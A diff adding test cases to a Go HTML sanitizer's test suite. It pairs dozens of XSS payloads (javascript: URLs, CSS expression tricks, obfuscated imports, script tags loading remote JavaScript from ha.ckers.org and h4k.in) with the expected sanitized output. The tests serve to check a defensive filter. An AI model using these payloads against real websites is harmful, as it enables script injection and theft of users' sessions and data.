@@ -357,6 +357,194 @@ func TestAntiSamy(t *testing.T) {
 			in:       `<BGSOUND SRC="javascript:alert('XSS');">`,
 			expected: ``,
 		},
+		// HREF attacks
+		test{
+			in:       `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
+			expected: ``,
+		},
+		test{
+			in:       `<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">`,
+			expected: ``,
+		},
+		test{
+			in:       `<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>`,
+			expected: ``,
+		},
+		test{
+			in:       `<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>`,
+			expected: ``,
+		},
+		test{
+			in:       `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS`,
+			expected: `<ul><li>XSS`,
+		},
+		test{
+			in:       `<IMG SRC='vbscript:msgbox("XSS")'>`,
+			expected: ``,
+		},
+		test{
+			in:       `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`,
+			expected: ``,
+		},
+		test{
+			in:       `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
+			expected: ``,
+		},
+		test{
+			in:       `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
+			expected: ``,
+		},
+		test{
+			in:       `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
+			expected: ``,
+		},
+		test{
+			in:       `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
+			expected: ``,
+		},
+		test{
+			in:       `<TABLE BACKGROUND="javascript:alert('XSS')">`,
+			expected: ``,
+		},
+		test{
+			in:       `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
+			expected: `<td>`,
+		},
+		test{
+			in:       `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
+			expected: `<div>`,
+		},
+		test{
+			in:       `<DIV STYLE="width: expression(alert('XSS'));">`,
+			expected: `<div>`,
+		},
+		test{
+			in:       `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
+			expected: ``,
+		},
+		test{
+			in:       `<STYLE>@im\\port'\\ja\\vasc\\ript:alert("XSS")';</STYLE>`,
+			expected: ``,
+		},
+		test{
+			in:       `<BASE HREF="javascript:alert('XSS');//">`,
+			expected: ``,
+		},
+		test{
+			in:       `<BaSe hReF="http://arbitrary.com/">`,
+			expected: ``,
+		},
+		test{
+			in:       `<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>`,
+			expected: ``,
+		},
+		test{
+			in:       `<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>`,
+			expected: ``,
+		},
+		test{
+			in:       `<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>`,
+			expected: ``,
+		},
+		test{
+			in:       `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
+			expected: ``,
+		},
+		test{
+			in:       `<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
+			expected: ``,
+		},
+		test{
+			in:       `<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
+			expected: ``,
+		},
+		test{
+			in:       "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
+			expected: ``,
+		},
+		test{
+			in:       `<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
+			expected: ``,
+		},
+		test{
+			in:       `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
+			expected: `PT SRC=&#34;http://ha.ckers.org/xss.js&#34;&gt;`,
+		},
+		test{
+			in:       `<SCRIPT SRC=http://ha.ckers.org/xss.js`,
+			expected: ``,
+		},
+		test{
+			in:       `<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>`,
+			expected: `<div>`,
+		},
+		test{
+			in:       `<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>`,
+			expected: ``,
+		},
+		test{
+			in:       `<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->`,
+			expected: `test--&gt;`,
+		},
+		test{
+			in:       `<a></a style="xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">`,
+			expected: ``,
+		},
+		// CSS attacks
+		test{
+			in:       `<div style="position:absolute">`,
+			expected: `<div>`,
+		},
+		test{
+			in:       `<style>b { position:absolute }</style>`,
+			expected: ``,
+		},
+		test{
+			in:       `<div style="z-index:25">test</div>`,
+			expected: `<div>test</div>`,
+		},
+		test{
+			in:       `<style>z-index:25</style>`,
+			expected: ``,
+		},
+		// Strings that cause issues for tokenizers
+		test{
+			in:       `<a - href="http://www.test.com">`,
+			expected: `<a href="http://www.test.com">`,
+		},
+		// Comments
+		test{
+			in:       `text <!-- comment -->`,
+			expected: `text `,
+		},
+		test{
+			in:       `<div>text <!-- comment --></div>`,
+			expected: `<div>text </div>`,
+		},
+		test{
+			in:       `<div>text <!--[if IE]> comment <[endif]--></div>`,
+			expected: `<div>text </div>`,
+		},
+		test{
+			in:       `<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>`,
+			expected: `<div>text &lt;[endif]--&gt;</div>`,
+		},
+		test{
+			in:       `<div>text <!--[if IE]> <!-- IE specific --> comment <[endif]--></div>`,
+			expected: `<div>text  comment &lt;[endif]--&gt;</div>`,
+		},
+		test{
+			in:       `<div>text <!-- [ if lte 6 ]>\ncomment <[ endif\n]--></div>`,
+			expected: `<div>text </div>`,
+		},
+		test{
+			in:       `<div>text <![if !IE]> comment <![endif]></div>`,
+			expected: `<div>text  comment </div>`,
+		},
+		test{
+			in:       `<div>text <![ if !IE]> comment <![endif]></div>`,
+			expected: `<div>text  comment </div>`,
+		},
 	}
 
 	for ii, test := range tests {
